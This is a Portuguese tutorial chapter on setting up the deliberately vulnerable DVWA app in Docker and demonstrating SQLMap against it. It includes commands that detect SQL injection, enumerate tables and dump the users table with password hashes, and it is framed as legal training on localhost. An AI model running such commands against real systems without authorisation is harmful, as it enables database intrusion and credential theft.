# 03 — Ambiente de Teste (DVWA via Docker)

Para demonstrar o SQLMap de forma **legal e segura**, usamos o **DVWA** (*Damn
Vulnerable Web Application*) — um app PHP/MySQL **propositalmente vulnerável**, criado
para treino de segurança. Subimos tudo com **Docker**, sem instalar nada manualmente.

> ⚠️ **Aviso legal**
> O DVWA é um alvo de treino. **Nunca** aponte o SQLMap para sistemas que não sejam seus
> ou para os quais você não tenha autorização escrita. Mantenha o DVWA acessível apenas
> na sua máquina (`localhost`), nunca exposto à internet.

## Pré-requisitos

- **Docker** instalado (`docker --version`).
- **SQLMap** instalado (ver [02 — Instalação](02-instalacao.md)).

## 1. Subir o DVWA

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

- `--rm`: remove o container ao encerrar.
- `-p 80:80`: publica a aplicação em `http://localhost`.

Aguarde a mensagem de que o Apache iniciou e acesse no navegador:

```
http://localhost/
```

## 2. Inicializar o banco de dados

1. Na primeira vez, o DVWA redireciona para `setup.php`.
2. Clique em **"Create / Reset Database"**.
3. Faça login com as credenciais padrão:

   | Campo | Valor |
   |-------|-------|
   | Usuário | `admin` |
   | Senha | `password` |

## 3. Ajustar o nível de segurança

Vá em **DVWA Security** e escolha o nível:

| Nível | Comportamento |
|-------|---------------|
| **Low** | Sem proteção — ideal para a primeira demo |
| **Medium** | Filtros simples (bom para mostrar `--level`/`--tamper`) |
| **High** | Proteções mais fortes |
| **Impossible** | Código corrigido (queries parametrizadas) — serve de exemplo de **defesa** |

Comece em **Low** e, se sobrar tempo, mostre como **Impossible** bloqueia o ataque.

## 4. Capturar o endpoint vulnerável e o cookie

1. Acesse o menu **SQL Injection**. A URL será algo como:

   ```
   http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit
   ```

2. Pegue o **cookie de sessão**: abra o DevTools do navegador (F12) → aba
   *Application/Storage* → Cookies, e copie `PHPSESSID` e `security`. O cookie ficará
   assim:

   ```
   security=low; PHPSESSID=xxxxxxxxxxxxxxxxxxxx
   ```

## 5. Demonstração completa com o SQLMap

Com a URL e o cookie em mãos:

```bash
URL='http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit'
COOKIE='security=low; PHPSESSID=xxxxxxxxxxxxxxxxxxxx'

# Detectar a injeção e listar bancos
python sqlmap.py -u "$URL" --cookie="$COOKIE" --batch --dbs

# Enumerar tabelas do banco dvwa
python sqlmap.py -u "$URL" --cookie="$COOKIE" --batch -D dvwa --tables

# Extrair os usuários e senhas
python sqlmap.py -u "$URL" --cookie="$COOKIE" --batch -D dvwa -T users --dump
```

Resultado esperado: o SQLMap identifica o MySQL, lista as tabelas e extrai a tabela
`users` (com os hashes de senha, que ele se oferece para quebrar).

Veja o detalhamento das flags em [04 — Uso e Comandos](04-uso-e-comandos.md).

## 6. Encerrar o ambiente

Basta interromper o container (`Ctrl+C` no terminal do `docker run`). Como usamos
`--rm`, ele é removido automaticamente.

## Alternativas de alvo (opcional)

- **OWASP Juice Shop** — app moderno (Node), SQLi mais realista.
- **bWAPP / Mutillidae** — muitos cenários variados de SQLi.

O DVWA foi escolhido por ser o mais simples de subir e o mais didático para a demo.

---

⬅️ Anterior: [02 — Instalação](02-instalacao.md) | ➡️ Próximo: [04 — Uso e Comandos](04-uso-e-comandos.md)
